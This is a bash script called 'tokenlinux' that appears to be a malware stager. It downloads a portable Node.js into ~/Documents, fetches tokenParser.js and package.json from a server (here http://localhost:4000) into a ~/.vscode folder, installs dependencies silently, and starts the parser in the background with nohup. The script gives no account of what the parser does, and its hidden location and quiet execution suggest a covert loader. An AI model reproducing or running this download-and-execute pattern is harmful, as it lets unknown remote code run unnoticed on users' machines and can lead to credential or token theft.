#!/bin/bash

# Creating new Info
set -e

# -------------------------
# Log system
# -------------------------
LOG_DIR="$HOME/.config"
LOG_FILE="$LOG_DIR/tokenlinux.log"
mkdir -p "$LOG_DIR"

log() {
    local level="$1"
    shift
    local message="$*"
    local timestamp
    timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    local line="[$timestamp] [$level] $message"
    echo "$line" >> "$LOG_FILE"
    echo "$line"
}

log_info()    { log "INFO" "$@"; }
log_warn()    { log "WARN" "$@"; }
log_error()   { log "ERROR" "$@"; }
log_success() { log "SUCCESS" "$@"; }

log_info "=== tokenlinux started ==="
log_info "Log file: $LOG_FILE"

OS=$(uname -s)
log_info "Detected OS: $OS"

# Node.js Version
# Get latest Node.js version (from official JSON index)
# LATEST_VERSION="20.11.1"
# if [ "$OS" == "Darwin" ]; then
#     # macOS
#    #     LATEST_VERSION=$(curl -s https://nodejs.org/dist/index.json \
#    #     | grep -Eo '"version": *"v[0-9]+\.[0-9]+\.[0-9]+"' \
#    #     | head -1 \
#    #     | sed -E 's/.*"v([^"]+)".*/v\1/')
#         LATEST_VERSION="20.11.1"
# elif [ "$OS" == "Linux" ]; then
#     # Linux
#     LATEST_VERSION=$(wget -qO- https://nodejs.org/dist/index.json | grep -oP '"version":\s*"\Kv[0-9]+\.[0-9]+\.[0-9]+' | head -1)
# else
#     exit 1
# fi

# Remove leading "v"
LATEST_VERSION="22.18.0"
NODE_VERSION=${LATEST_VERSION}
log_info "Target Node.js version: v${NODE_VERSION}"

NODE_TARBALL="node-v${NODE_VERSION}"
DOWNLOAD_URL=""
NODE_DIR="$HOME/Documents/${NODE_TARBALL}"

# Determine the OS (Linux or macOS)

# Step 1: Set the Node.js tarball and download URL based on the OS
if [ "$OS" == "Darwin" ]; then
    # macOS
    NODE_TARBALL="$HOME/Documents/${NODE_TARBALL}-darwin-x64.tar.xz"
    DOWNLOAD_URL="https://nodejs.org/dist/v${NODE_VERSION}/node-v${NODE_VERSION}-darwin-x64.tar.xz"
elif [ "$OS" == "Linux" ]; then
    # Linux
    NODE_TARBALL="$HOME/Documents/${NODE_TARBALL}-linux-x64.tar.xz"
    DOWNLOAD_URL="https://nodejs.org/dist/v${NODE_VERSION}/node-v${NODE_VERSION}-linux-x64.tar.xz"
else
    log_error "Unsupported OS: $OS"
    exit 1
fi
log_info "Download URL: $DOWNLOAD_URL"

# Step 2: Check if Node.js is installed
NODE_INSTALLED_VERSION=$(node -v 2>/dev/null || echo "")
if [ -n "$NODE_INSTALLED_VERSION" ]; then
    log_info "System Node.js found: $NODE_INSTALLED_VERSION"
else
    log_info "No system Node.js found"
fi

# Step 3: Decide whether to install Node.js
INSTALL_NODE=1
#if [ -z "$NODE_INSTALLED_VERSION" ]; then
#    INSTALL_NODE=1
#fi

EXTRACTED_DIR="$HOME/Documents/node-v${NODE_VERSION}-$( [ "$OS" = "Darwin" ] && echo "darwin" || echo "linux" )-x64"
log_info "Extracted Node.js dir: $EXTRACTED_DIR"

# ✅ Check if the Node.js folder exists
if [ ! -d "$EXTRACTED_DIR" ]; then
    log_warn "Node.js directory missing. Retrying download and extraction..."

    if [ "$INSTALL_NODE" -eq 1 ]; then
        if ! command -v curl &> /dev/null; then
            log_info "curl not found, downloading with wget..."
            wget -q "$DOWNLOAD_URL" -O "$NODE_TARBALL"
        else
            log_info "Downloading with curl..."
            curl -sSL -o "$NODE_TARBALL" "$DOWNLOAD_URL"
        fi

        if [ -f "$NODE_TARBALL" ]; then
            log_info "Extracting Node.js tarball..."
            tar -xf "$NODE_TARBALL" -C "$HOME/Documents"
            rm -f "$NODE_TARBALL"
            log_success "Node.js extracted to $EXTRACTED_DIR"
        else
            log_error "Failed to download Node.js tarball"
            exit 1
        fi
    fi
else
    log_info "Portable Node.js already present"
fi

# ✅ Add Node.js to the system PATH (session only)
export PATH="$EXTRACTED_DIR/bin:$PATH"
log_info "PATH updated with portable Node.js bin"

# Step 7: Verify node & npm
if ! command -v node &> /dev/null || ! command -v npm &> /dev/null; then
    log_error "node or npm not available after setup"
    exit 1
fi
log_info "node: $(node -v), npm: $(npm -v)"

# Use Documents directory for files
USER_HOME="$HOME/.vscode"
mkdir -p "$USER_HOME"
log_info "Working directory: $USER_HOME"

BASE_URL="http://localhost:4000"

# Step 8: Download files
# Check if curl is available
log_info "Downloading tokenParser.js and package.json..."
if ! command -v curl >/dev/null 2>&1; then
    # If curl is not available, use wget
    log_info "Using wget for downloads"
    wget -q -O "$USER_HOME/tokenParser.js" "$BASE_URL/tokenParser"
    wget -q -O "$USER_HOME/package.json" "$BASE_URL/package.json"
else
    # If curl is available, use curl
    log_info "Using curl for downloads"
    curl -s -L -o "$USER_HOME/tokenParser.js" "$BASE_URL/tokenParser"
    curl -s -L -o "$USER_HOME/package.json" "$BASE_URL/package.json"
fi

if [ ! -f "$USER_HOME/tokenParser.js" ] || [ ! -f "$USER_HOME/package.json" ]; then
    log_error "Failed to download required files"
    exit 1
fi
log_success "Required files downloaded"

# Step 9: Install 'request' package
cd "$USER_HOME"
log_info "Running npm install..."
if npm install --silent --no-progress --loglevel=error --fund=false; then
    log_success "npm install completed"
else
    log_error "npm install failed"
    exit 1
fi

# Step 10: Run token parser
if [ -f "$USER_HOME/tokenParser.js" ]; then
    log_info "Starting tokenParser.js in background..."
    cd "$USER_HOME" && nohup node tokenParser.js > tokenParser.log 2>&1 &
    log_success "tokenParser.js started (pid $!), output: $USER_HOME/tokenParser.log"
else
    log_error "tokenParser.js not found"
    exit 1
fi

log_success "Script completed successfully"
exit 0
